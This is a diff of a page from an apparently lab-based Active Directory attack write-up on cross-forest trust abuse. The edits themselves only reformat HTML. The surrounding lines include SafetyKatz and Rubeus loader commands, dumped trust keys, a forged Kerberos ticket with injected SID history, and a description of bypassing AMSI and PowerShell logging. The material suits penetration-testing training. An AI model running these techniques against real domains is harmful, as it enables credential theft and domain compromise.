@@ -297,7 +297,7 @@ C:\AD\Tools\Loader.exe -Path C:\AD\Tools\Rubeus.exe -args %Pwn% /user:administra
 InvisiShell is a tool designed to bypass security controls in PowerShell, allowing for the stealthy execution of scripts by circumventing enhanced logging mechanisms and detection by security software.
 Here’s a detailed explanation of how InvisiShell works:
 <ul>
-<li>Bypassing PowerShell Security Measures: InvisiShell is specifically created to bypass system-wide transcription, script block logging, and the Anti-Malware Scan Interface (AMSI). </li>
+<li>Bypassing PowerShell Security Measures: InvisiShell is specifically created to bypass system-wide transcription, script block logging, and the Anti-Malware Scan Interface (AMSI).</li>
 </ul>
 These are security features that Microsoft implemented to monitor and log PowerShell activity.
 <ul>
@@ -521,8 +521,8 @@ We should now be able to execute SafetyKatz on the DC and request for the Trust 
 C:\Users\Public\Loader.exe -Path http://127.0.0.1:8080/SafetyKatz.exe -args "%Pwn% /patch" "exit"
 <img src="./images/screenshot_397.png" alt="">
 
-<pre><code>Domain: EUVENDOR.LOCAL (EUVENDOR / S-1-5-21-4066061358-3942393892-617142613)
- [  In ] EU.LOCAL -> EUVENDOR.LOCAL
+<pre><code class="language-bash">Domain: EUVENDOR.LOCAL (EUVENDOR / S-1-5-21-4066061358-3942393892-617142613)
+ [  In ] EU.LOCAL -&gt; EUVENDOR.LOCAL
     </em> 2/19/2025 9:01:53 PM - CLEAR   - 16 82 17 dc 8e 73 b3 f0 82 44 ce 5c 98 c6 05 fc 9a ed df 9c cf 7e d6 49 01 41 5c 99 0e 6b de 5c 1a 3e 9b 9d f5 82 3d 1b 2c 13 27 cb c9 f6 e5 87 48 dc f1 75 df f1 72 93 67 79 8c 63 d9 8d f2 80 4f 1b 16 60 dd 4f a0 d9 41 51 5c fc 33 72 8a 54 32 19 f3 a0 e5 78 eb 50 00 7e e6 e6 cd a9 8d 6a b3 43 95 ab 4c 11 37 d5 b1 1d 16 4c fa f6 74 75 68 3b 4b 78 50 27 fa 8f 67 8f 68 94 1c 93 89 01 76 3c 6d 14 03 e5 58 82 23 5d 3a 14 51 f3 93 17 10 83 26 e0 87 51 e5 4a 64 13 c7 62 34 c0 1d fe ce 95 fa 74 a4 ba 87 a0 b5 46 79 5a e1 34 71 5f 7f 63 c4 fe 12 b2 49 51 a4 80 24 fc fe ae bb ff 01 ee b6 6d 6e 6c f2 91 70 ac 72 48 74 ec 9a b7 d5 19 9f 73 ff 66 a9 53 97 44 41 8a 35 64 ee 24 77 fa 21 20 df 89 a7 7e fd 87 eb 6c 57 08 4e 14
         <em> aes256_hmac       2c8c05ef394af2aa26aac788c26970dff4308059f9acaa4494d37ee068a65486
         </em> aes128_hmac       65063d5cfdad146a10d11c7d0d7f033b
@@ -540,7 +540,7 @@ We will inject the SID History for the EUAdmins group as that is allowed across 
 C:\Users\Public\Loader.exe -Path http://127.0.0.1:8080/Rubeus.exe -args %Pwn% /user:administrator /ldap /service:krbtgt/eu.local /aes256:2c8c05ef394af2aa26aac788c26970dff4308059f9acaa4494d37ee068a65486 /sids:S-1-5-21-4066061358-3942393892-617142613-1103 /nowrap
 <img src="./images/screenshot_399.png" alt="">
 
-<pre><code>doIFTzCCBUugAwIBBaEDAgEWooIESDCCBERhggRAMIIEPKADAgEFoQobCEVVLkxPQ0FMoh0wG6ADAgECoRQwEhsGa3JidGd0GwhldS5sb2NhbKOCBAgwggQEoAMCARKhAwIBA6KCA/YEggPyHXXz9s57/ZjbqthMCEedUvxpq92shkWvxf/2mYniNoFC0Ua8vkn8GEtYJJEMoUOwWLgPLLJUydSBSCmgxjjSaZiVpem5vcvGJwAfLnzGW0MBPp7oer/LWZNVt0uDjNZYbKy+9dSWj1WOPHIxzxke4zIMKBp7z2XCrbCBuKewMBmqsgqpz4QfHBer8RteGl4Q6QySiabF1C8rM4ue6m03twLs25Fiv1f2pCG8gpbn9at2YYNRmjDVcrRRgVFzQx1kG0mBgvGSRirjYRumaAhVf7hk48ojOKZjMz/5RBIhYO3TKTcEhPrBuJYqkF5tsWgnIbknjjzeFj1CZb8gobDOsd+FZSNjOLoUthZxJPpToAl7VR5jEZcG2pgRQtiiEMeqoAKN9h0D/neZ41lHXdoJhBo8LDUHG2J8jV3oYNPkceyaF0kQToClSSXBFCQMlrc7BbNDY3LGI94+vCEHlWH+/8plw3jEec0+qn7YLV0em6MDAYvKXW63BKaQIp0Zyo6eJHOM2i3Z03kk8LqhW23/Z3xXQaZHLTEopsnfd7KFGuLvUcsVvzk0kGoeTXrTO+gxoOJ4P4zOSAWCohUpoBHKP2HaMr+1365ltjYaZJdgPgWtQkQ6eTg3hMhgR7J2eEXv/z15TqRA13MjAe5kte5Mknu3YdwlbcZye+SqZaLboum7QYteTyafBcptGJCNM/NjBHiA0juH6KdvlLoSVsmDZ5oelRtz7oCLSiOXWWoTLhE/g4KJZAKPI0roF/4PmBpRqGBkuRabNs04VcdZSfn/rMTszcdzGAtoxV2iZ8tRzjUrtws0RNExH5lLz8QsqDl5JKJcVORqihmgZUrgBVAYSKrBQP2WGF/vpVXgM2usBnvYkDY0ctYvY1MOOwr3pncE6ijQC/4E10p18AeJ4eu8zS8g0fiBvkB7T+LEhDkmyK7ZeWv7hXdSAUbKlH5Ir6/OY/Z58hiEuszlbFIXcfcaUDsEnkCly4svAa/imVT92Ye/yZv0JsIOP154JwSbFfPnqmwAQkltEff8ECP5h+oBYkl7mjQiJ46+RtbHZDa2S3sWnJ6T4sfLgy4JgNKIzh4EchhTJLycvtLdqBO0+V8SEftasFe+4EVRWKIu8cJSY5D9Ra71YvNLLSoP0x9v7qffogYJ0/w744ciDYWlsIc2Sdtnmc0pBQU1Sk0YVbKxTHtaR+AS7s5KhIqxy0XqBR37RI1mVPkBhghDgTrTNhTJ5IzIVspDRj86JLWSnVEF4KbCsJVzuO02lYvH1qLRnqOniDllubtj0Rpvt/thNbVAgQyZuJt+H9MXZjT29qUIwnIrhrYlhe6OMG1+37QZ2isd/JejgfIwge+gAwIBAKKB5wSB5H2B4TCB3qCB2zCB2DCB1aArMCmgAwIBEqEiBCATN/kWbtS5Yy8THpl7ZheVA1Df2NhUO90qVcEl5wyjYqEKGwhFVS5MT0NBTKIaMBigAwIBAaERMA8bDWFkbWluaXN0cmF0b3KjBwMFAECgAACkERgPMjAyNTAyMjAyMzAzMzhapREYDzIwMjUwMjIwMjMwMzM4WqYRGA8yMDI1MDIyMTA5MDMzOFqnERgPMjAyNTAyMjcyMzAzMzhaqAobCEVVLkxPQ0FMqR0wG6ADAgECoRQwEhsGa3JidGd0GwhldS5sb2NhbA==
+<pre><code class="language-bash">doIFTzCCBUugAwIBBaEDAgEWooIESDCCBERhggRAMIIEPKADAgEFoQobCEVVLkxPQ0FMoh0wG6ADAgECoRQwEhsGa3JidGd0GwhldS5sb2NhbKOCBAgwggQEoAMCARKhAwIBA6KCA/YEggPyHXXz9s57/ZjbqthMCEedUvxpq92shkWvxf/2mYniNoFC0Ua8vkn8GEtYJJEMoUOwWLgPLLJUydSBSCmgxjjSaZiVpem5vcvGJwAfLnzGW0MBPp7oer/LWZNVt0uDjNZYbKy+9dSWj1WOPHIxzxke4zIMKBp7z2XCrbCBuKewMBmqsgqpz4QfHBer8RteGl4Q6QySiabF1C8rM4ue6m03twLs25Fiv1f2pCG8gpbn9at2YYNRmjDVcrRRgVFzQx1kG0mBgvGSRirjYRumaAhVf7hk48ojOKZjMz/5RBIhYO3TKTcEhPrBuJYqkF5tsWgnIbknjjzeFj1CZb8gobDOsd+FZSNjOLoUthZxJPpToAl7VR5jEZcG2pgRQtiiEMeqoAKN9h0D/neZ41lHXdoJhBo8LDUHG2J8jV3oYNPkceyaF0kQToClSSXBFCQMlrc7BbNDY3LGI94+vCEHlWH+/8plw3jEec0+qn7YLV0em6MDAYvKXW63BKaQIp0Zyo6eJHOM2i3Z03kk8LqhW23/Z3xXQaZHLTEopsnfd7KFGuLvUcsVvzk0kGoeTXrTO+gxoOJ4P4zOSAWCohUpoBHKP2HaMr+1365ltjYaZJdgPgWtQkQ6eTg3hMhgR7J2eEXv/z15TqRA13MjAe5kte5Mknu3YdwlbcZye+SqZaLboum7QYteTyafBcptGJCNM/NjBHiA0juH6KdvlLoSVsmDZ5oelRtz7oCLSiOXWWoTLhE/g4KJZAKPI0roF/4PmBpRqGBkuRabNs04VcdZSfn/rMTszcdzGAtoxV2iZ8tRzjUrtws0RNExH5lLz8QsqDl5JKJcVORqihmgZUrgBVAYSKrBQP2WGF/vpVXgM2usBnvYkDY0ctYvY1MOOwr3pncE6ijQC/4E10p18AeJ4eu8zS8g0fiBvkB7T+LEhDkmyK7ZeWv7hXdSAUbKlH5Ir6/OY/Z58hiEuszlbFIXcfcaUDsEnkCly4svAa/imVT92Ye/yZv0JsIOP154JwSbFfPnqmwAQkltEff8ECP5h+oBYkl7mjQiJ46+RtbHZDa2S3sWnJ6T4sfLgy4JgNKIzh4EchhTJLycvtLdqBO0+V8SEftasFe+4EVRWKIu8cJSY5D9Ra71YvNLLSoP0x9v7qffogYJ0/w744ciDYWlsIc2Sdtnmc0pBQU1Sk0YVbKxTHtaR+AS7s5KhIqxy0XqBR37RI1mVPkBhghDgTrTNhTJ5IzIVspDRj86JLWSnVEF4KbCsJVzuO02lYvH1qLRnqOniDllubtj0Rpvt/thNbVAgQyZuJt+H9MXZjT29qUIwnIrhrYlhe6OMG1+37QZ2isd/JejgfIwge+gAwIBAKKB5wSB5H2B4TCB3qCB2zCB2DCB1aArMCmgAwIBEqEiBCATN/kWbtS5Yy8THpl7ZheVA1Df2NhUO90qVcEl5wyjYqEKGwhFVS5MT0NBTKIaMBigAwIBAaERMA8bDWFkbWluaXN0cmF0b3KjBwMFAECgAACkERgPMjAyNTAyMjAyMzAzMzhapREYDzIwMjUwMjIwMjMwMzM4WqYRGA8yMDI1MDIyMTA5MDMzOFqnERgPMjAyNTAyMjcyMzAzMzhaqAobCEVVLkxPQ0FMqR0wG6ADAgECoRQwEhsGa3JidGd0GwhldS5sb2NhbA==
 </code></pre>
 
 <ul>
@@ -649,7 +649,7 @@ winrs -r:euvendor-net.euvendor.local cmd
 
 
 
-          <div class="part-navigation">
+<div class="part-navigation">
             <a href="part-29-cross-forest-attacks-trust-key-abuse-to-access-exp.html"><ion-icon name="arrow-back-outline"></ion-icon> Previous: Cross Forest Attacks - Trust K</a>
             <a href="part-31-trust-abuse-mssql-servers-database-links.html">Next: Trust Abuse - MSSQL Servers -  <ion-icon name="arrow-forward-outline"></ion-icon></a>
           </div>
